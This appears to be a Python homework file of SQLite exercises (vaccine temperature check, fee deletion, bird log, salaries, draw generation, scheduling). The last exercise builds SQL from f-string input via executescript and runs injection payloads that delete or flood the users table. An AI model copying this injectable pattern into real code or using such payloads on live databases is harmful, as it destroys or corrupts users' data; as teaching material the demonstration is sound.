# Задание 1
import sqlite3

sql_query = """SELECT * FROM 'table_truck_with_vaccine'
WHERE temperature_in_celsius NOT BETWEEN 16 AND 20 AND truck_number = ? ORDER BY timestamp
"""


def check_if_vaccine_has_spoiled(cursor: sqlite3.Cursor, truck_number: str) -> bool:
    cursor.execute(sql_query, (truck_number,))
    results = cursor.fetchall()
    print(results)
    return len(results) >= 3


if __name__ == "__main__":
    with sqlite3.connect("homework.db") as conn:
        cursor = conn.cursor()
        truck_number = input("Enter the truck number:\n")
        if check_if_vaccine_has_spoiled(cursor, truck_number):
            print("The vaccine has spoiled")
        else:
            print("The vaccine has NOT spoiled")

# Задание 2
import sqlite3
import csv

sql_query = """ DELETE FROM 'table_fees'
WHERE truck_number = ? AND timestamp = ?
"""


def delete_wrong_fees(cursor: sqlite3.Cursor, wrong_fees_file: str) -> None:
    with open(wrong_fees_file) as csvfile:
        reader = csv.reader(csvfile, delimiter=",")
        for row in reader:
            cursor.execute(sql_query, (row[0], row[1]))


if __name__ == "__main__":
    with sqlite3.connect("homework13.2.db") as conn:
        cursor = conn.cursor()
        delete_wrong_fees(cursor, "wrong_fees.csv")

# Задание 3
import datetime
import sqlite3

check_availability_query = """
SELECT EXISTS(SELECT * FROM 'birds' WHERE bird_name = ?)
"""

add_bird_query = """ 
INSERT INTO 'birds' (bird_name, time) VALUES (?, ?);
"""


def log_bird(cursor: sqlite3.Cursor, bird_name: str, date_time: str) -> None:
    cursor.execute(add_bird_query, (bird_name, date_time))
    print(f"Bird '{bird_name}' logged.")


def check_if_such_bird_already_seen(cursor: sqlite3.Cursor, bird_name: str) -> bool:
    cursor.execute(check_availability_query, (bird_name,))
    result = cursor.fetchone()
    return result[0]


if __name__ == "__main__":
    with sqlite3.connect("homework.db") as conn:
        cursor = conn.cursor()
        bird_name = input("Enter the bird's name:\n").lower()
        if not check_if_such_bird_already_seen(cursor, bird_name):
            log_bird(cursor, bird_name, str(datetime.datetime.now().time()))
        else:
            print(f"{bird_name} is already logged.")

# Задание 4
import sqlite3

get_worker_salary_query = (
    """SELECT salary FROM 'table_effective_manager' WHERE name = ?"""
)
update_worker_salary_query = (
    """UPDATE 'table_effective_manager' SET salary = ? WHERE name = ?"""
)
delete_worker_query = """DELETE FROM 'table_effective_manager' WHERE name = ?"""


def ivan_sovin_the_most_effective(cursor: sqlite3.Cursor, name: str) -> None:
    cursor.execute(get_worker_salary_query, (name,))
    salary = cursor.fetchone()[0]
    print("Worker's salary:", salary)
    new_salary = salary * 1.10  # Increase salary by 10%
    if new_salary > ivan_sovin_salary:
        cursor.execute(delete_worker_query, (name,))
        print(f"The salary was too high, and worker {name} was dismissed.")
    else:
        cursor.execute(update_worker_salary_query, (new_salary, name))
        print(f"The salary of worker {name} was increased to {new_salary}.")


if __name__ == "__main__":
    with sqlite3.connect("homework.db") as conn:
        cursor = conn.cursor()
        name = input("Enter the worker's name:\n")
        cursor.execute(get_worker_salary_query, ("Иван Совин",))
        ivan_sovin_salary = cursor.fetchone()[0]
        print("Ivan Sovin's salary:", ivan_sovin_salary)
        ivan_sovin_the_most_effective(cursor, name)

# Задание 5
import sqlite3
import random

other_commands = ('Bulls USA, Heat USA, Lakers USA, Celtics USA, Raptors Canada, Rockets USA, 76ers USA, Nuggets USA, '
                  'Mavericks USA, Nets USA, Warriors USA, Trail Blazers USA, Spurs USA, Jazz USA, Thunder USA, '
                  'Pacers USA, Suns USA, Grizzlies USA, Pelicans USA, Hawks USA, Wizards USA, Timberwolves USA, '
                  'Hornets USA, Magic USA, Pistons USA, Kings USA, Real Madrid Spain, Barcelona Spain, Atletico Madrid Spain, '
                  'Valencia Spain, Sevilla Spain, Bayern Munich Germany, Borussia Dortmund Germany, RB Leipzig Germany, '
                  'PSG France, Marseille France, Lyon France, Juventus Italy, Inter Milan Italy, AC Milan Italy, Napoli Italy, '
                  'Roma Italy, Ajax Netherlands, PSV Eindhoven Netherlands, Feyenoord Netherlands, Benfica Portugal, Porto Portugal, '
                  'Sporting Lisbon Portugal, Galatasaray Turkey, Fenerbahce Turkey, Besiktas Turkey, Celtic Scotland, '
                  'Rangers Scotland, Porto Portugal, Porto Portugal, Celtic Scotland, Rangers Scotland, Boca Juniors Argentina, '
                  'River Plate Argentina, Sao Paulo Brazil, Flamengo Brazil, Corinthians Brazil, Palmeiras Brazil, '
                  'Vasco da Gama Brazil, Santos Brazil, Atletico Mineiro Brazil, Internacional Brazil, Gremio Brazil, '
                  'Fluminense Brazil, Botafogo Brazil, Cruzeiro Brazil, Pachuca Mexico, Tigres Mexico, Monterrey Mexico, '
                  'Chivas Mexico, Club America Mexico, Santos Laguna Mexico, Cruz Azul Mexico, Leon Mexico, Necaxa Mexico, Puebla Mexico')
other_commands_list = other_commands.split(", ")

sql_insert_uefa_commands = """INSERT INTO 'uefa_commands' 
(command_number, command_name, command_country, command_level) VALUES (?, ?, ?, ?)
"""

sql_insert_uefa_draw = """INSERT INTO 'uefa_draw' (command_number, group_number) VALUES (?, ?)
"""


def generate_test_data(cursor: sqlite3.Cursor, number_of_groups: int) -> None:
    command_levels = [number_of_groups, number_of_groups * 2, number_of_groups]
    command_levels_group = [[1, 2, 1] for _ in range(number_of_groups)]
    command_data = []
    draw_data = []

    for i in range(1, number_of_groups * 4 + 1):
        command = random.choice(other_commands_list).split()
        level = int(random.choice(["1", "2", "3"]))

        while command_levels[level - 1] == 0:
            level = int(random.choice(["1", "2", "3"]))

        group_index = level - 1
        group_count = 0

        while command_levels_group[group_count][group_index] == 0:
            group_count += 1
        else:
            command_levels_group[group_count][group_index] -= 1
            draw_data.append((i, group_count + 1))

        command_levels[level - 1] -= 1
        command_data.append((i, command[0], command[1], level))

    cursor.executemany(sql_insert_uefa_commands, command_data)
    cursor.executemany(sql_insert_uefa_draw, draw_data)


if __name__ == "__main__":
    with sqlite3.connect("homework.db") as conn:
        cursor = conn.cursor()
        number_of_groups = int(input("Enter the number of groups:\n"))
        generate_test_data(cursor, number_of_groups)

# Задание 6
from datetime import datetime, timedelta
import sqlite3

TOTAL_DAYS = 366
EMPLOYEES_PER_DAY = 10
TOTAL_EMPLOYEES = 366
WORKING_DAYS_PER_EMPLOYEE = TOTAL_DAYS * EMPLOYEES_PER_DAY // TOTAL_EMPLOYEES
WEEKDAYS = [
    "понедельник",
    "вторник",
    "среда",
    "четверг",
    "пятница",
    "суббота",
    "воскресенье",
]
ACTIVITIES = ["футбол", "хоккей", "шахматы", "SUP сёрфинг", "бокс", "Dota2", "шах-бокс"]

sql_clear_schedule = """
    DELETE FROM table_friendship_schedule
"""

sql_request_get_all_employees = """
    SELECT id, preferable_sport FROM table_friendship_employees
"""

sql_request_insert_employee = """
    INSERT INTO table_friendship_schedule (employee_id, date)
        VALUES (?,?)
"""


def clear_schedule(cursor: sqlite3.Cursor) -> None:
    cursor.execute(sql_clear_schedule)


def get_all_employees(cursor: sqlite3.Cursor) -> list:
    return cursor.execute(sql_request_get_all_employees).fetchall()


def insert_schedule(cursor: sqlite3.Cursor, employee_id: int, date: str) -> None:
    cursor.execute(sql_request_insert_employee, (employee_id, date))


def generate_schedule(conn: sqlite3.Connection) -> None:
    cursor = conn.cursor()
    clear_schedule(cursor)
    employees = get_all_employees(cursor)
    working_days = {employee[0]: 0 for employee in employees}
    start_date = datetime.strptime("2020-01-01", "%Y-%m-%d")
    workers_on_day = {start_date + timedelta(days=i): 0 for i in range(TOTAL_DAYS)}
    for day, _ in workers_on_day.items():
        for id, activity in employees:
            if WEEKDAYS[day.weekday()] == WEEKDAYS[ACTIVITIES.index(activity)]:
                continue
            if working_days[id] != WORKING_DAYS_PER_EMPLOYEE + 1:
                insert_schedule(cursor, id, str(day)[:10])
                working_days[id] += 1
                workers_on_day[day] += 1
                if workers_on_day[day] == EMPLOYEES_PER_DAY:
                    break
    conn.commit()


if __name__ == "__main__":
    with sqlite3.connect("homework.db") as conn:
        generate_schedule(conn)

# Задание 7
import sqlite3

def create_user(username: str, password: str) -> None:
    with sqlite3.connect('homework.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
                INSERT INTO 'table_users' (username, password)
                    VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()

def register_user(username: str, password: str) -> None:
    create_user(username, password)

def hack_system() -> None:
    # Injecting malicious data into the system
    malicious_username = "username"
    malicious_password = "'); DELETE FROM table_users; --"
    register_user(malicious_username, malicious_password)

    # Generating large amount of data for injection
    wrong_credentials = ", ".join([f"('wrong_username{i}', 'wrong_password{i}')" for i in range(100)])
    malicious_username = "username"
    malicious_password = f"password'); INSERT INTO table_users (username, password) VALUES {wrong_credentials}; --"
    register_user(malicious_username, malicious_password)

hack_system()
